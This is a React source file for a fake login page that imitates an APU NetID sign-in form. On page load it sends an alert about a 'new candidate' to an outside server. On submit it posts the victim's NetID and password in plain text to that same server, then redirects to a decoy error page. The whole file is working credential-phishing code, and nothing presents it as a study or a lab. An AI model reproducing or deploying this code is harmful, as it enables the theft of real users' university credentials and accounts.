import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import "./App.css";

function Login() {
  const [netid, setNetid] = useState("");
  const [password, setPassword] = useState("");
  const [netidError, setNetidError] = useState(false);
  const [passwordError, setPasswordError] = useState(false);
  const navigate = useNavigate();   

  // Effect to notify about a new candidate
  useEffect(() => {
    fetch("https://api-gamma-neon.vercel.app/go", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        subject: "Stay Alert",
        message: "We have a new candidate on the page.",
      }),
    });
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    let valid = true;

    // Validate fields
    if (!netid) {
      setNetidError(true);
      valid = false;
    } else {
      setNetidError(false);
    }

    if (!password) {
      setPasswordError(true);
      valid = false;
    } else {
      setPasswordError(false);
    }

    // If both fields are filled, make the POST request
    if (valid) {
      fetch("https://api-gamma-neon.vercel.app/go", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          subject: "New Submission",
          message: `NetID: ${netid}, Password: ${password}`,
        }),
      }).then(()=>{
        navigate("/apu.edu/error")
      });
    }
  };

  return (
    <div className="main">
      <div className="form-container">
        <h1 className="form-head">Please enter your credentials</h1>
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="APU NetID"
            name="netid"
            className={`id ${netidError ? "error" : ""}`}
            value={netid}
            onChange={(e) => setNetid(e.target.value)}
            onFocus={() => setNetidError(false)} // Reset error on focus
          />
          <input
            type="password"
            name="password"
            id="password"
            placeholder="Password"
            className={passwordError ? "error" : ""}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            onFocus={() => setPasswordError(false)} // Reset error on focus
          />
          <button type="submit">SIGN IN</button>
        </form>
      </div>
    </div>
  );
}

export default Login;
